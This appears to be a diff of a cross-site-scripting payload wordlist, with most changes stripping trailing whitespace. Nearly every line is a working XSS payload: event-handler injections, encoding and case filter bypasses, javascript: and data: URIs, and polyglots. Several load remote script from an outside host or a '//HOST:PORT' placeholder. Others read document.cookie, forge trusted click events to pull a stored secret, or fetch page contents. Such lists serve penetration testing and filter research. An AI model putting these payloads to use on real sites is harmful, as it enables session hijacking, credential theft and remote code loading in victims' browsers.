@@ -1,4 +1,3 @@
-MIME TEXT
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
@@ -22,78 +21,78 @@ MIME TEXT
 '-alert(1)//
 \'-alert(1)//
 </script><svg onload=alert(1)>
-<x contenteditable onblur=alert(1)>lose focus! 
-<x onclick=alert(1)>click this! 
-<x oncopy=alert(1)>copy this! 
-<x oncontextmenu=alert(1)>right click this! 
-<x oncut=alert(1)>copy this! 
-<x ondblclick=alert(1)>double click this! 
-<x ondrag=alert(1)>drag this! 
-<x contenteditable onfocus=alert(1)>focus this! 
-<x contenteditable oninput=alert(1)>input here! 
-<x contenteditable onkeydown=alert(1)>press any key! 
-<x contenteditable onkeypress=alert(1)>press any key! 
-<x contenteditable onkeyup=alert(1)>press any key! 
-<x onmousedown=alert(1)>click this! 
-<x onmousemove=alert(1)>hover this! 
-<x onmouseout=alert(1)>hover this! 
-<x onmouseover=alert(1)>hover this! 
-<x onmouseup=alert(1)>click this! 
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
 <x contenteditable onpaste=alert(1)>paste here!
-<script>alert(1)// 
+<script>alert(1)//
 <script>alert(1)<!–
-<script src=//brutelogic.com.br/1.js> 
+<script src=//brutelogic.com.br/1.js>
 <script src=//3334957647/1>
-%3Cx onxxx=alert(1) 
-<%78 onxxx=1 
-<x %6Fnxxx=1 
-<x o%6Exxx=1 
-<x on%78xx=1 
+%3Cx onxxx=alert(1)
+<%78 onxxx=1
+<x %6Fnxxx=1
+<x o%6Exxx=1
+<x on%78xx=1
 <x onxxx%3D1
-<X onxxx=1 
-<x OnXxx=1 
-<X OnXxx=1 
+<X onxxx=1
+<x OnXxx=1
+<X OnXxx=1
 <x onxxx=1 onxxx=1
-<x/onxxx=1 
-<x%09onxxx=1 
-<x%0Aonxxx=1 
-<x%0Conxxx=1 
-<x%0Donxxx=1 
-<x%2Fonxxx=1 
-<x 1='1'onxxx=1 
+<x/onxxx=1
+<x%09onxxx=1
+<x%0Aonxxx=1
+<x%0Conxxx=1
+<x%0Donxxx=1
+<x%2Fonxxx=1
+<x 1='1'onxxx=1
 <x 1="1"onxxx=1
-<x </onxxx=1 
-<x 1=">" onxxx=1 
+<x </onxxx=1
+<x 1=">" onxxx=1
 <http://onxxx%3D1/
 <x onxxx=alert(1) 1='
 <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
 'onload=alert(1)><svg/1='
-'>alert(1)</script><script/1=' 
+'>alert(1)</script><script/1='
 */alert(1)</script><script>/*
 */alert(1)">'onload="/*<svg/1='
 `-alert(1)">'onload="`<svg/1='
 */</script>'>alert(1)/*<script/1='
-<script>alert(1)</script> 
-<script src=javascript:alert(1)> 
-<iframe src=javascript:alert(1)> 
-<embed src=javascript:alert(1)> 
-<a href=javascript:alert(1)>click 
-<math><brute href=javascript:alert(1)>click 
-<form action=javascript:alert(1)><input type=submit> 
-<isindex action=javascript:alert(1) type=submit value=click> 
-<form><button formaction=javascript:alert(1)>click 
-<form><input formaction=javascript:alert(1) type=submit value=click> 
-<form><input formaction=javascript:alert(1) type=image value=click> 
-<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
-<isindex formaction=javascript:alert(1) type=submit value=click> 
-<object data=javascript:alert(1)> 
-<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
-<svg><script xlink:href=data:,alert(1) /> 
-<math><brute xlink:href=javascript:alert(1)>click 
+<script>alert(1)</script>
+<script src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
 <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
-<html ontouchstart=alert(1)> 
-<html ontouchend=alert(1)> 
-<html ontouchmove=alert(1)> 
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
 <html ontouchcancel=alert(1)>
 <body onorientationchange=alert(1)>
 "><img src=1 onerror=alert(1)>.gif
@@ -101,9 +100,9 @@ MIME TEXT
 GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <script src="data:&comma;alert(1)//
 "><script src=data:&comma;alert(1)//
-<script src="//brutelogic.com.br&sol;1.js&num; 
-"><script src=//brutelogic.com.br&sol;1.js&num; 
-<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+<script src="//brutelogic.com.br&sol;1.js&num;
+"><script src=//brutelogic.com.br&sol;1.js&num;
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
 "><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
 <base href=//0>
 <script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
@@ -6220,9 +6219,9 @@ x”</title><img src%3dx onerror%3dalert(1)>
 <script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
 <script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
 <iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
-<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> 
+<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>
 <img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
-<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # 
+<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #
 <SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
 <script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
 <video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
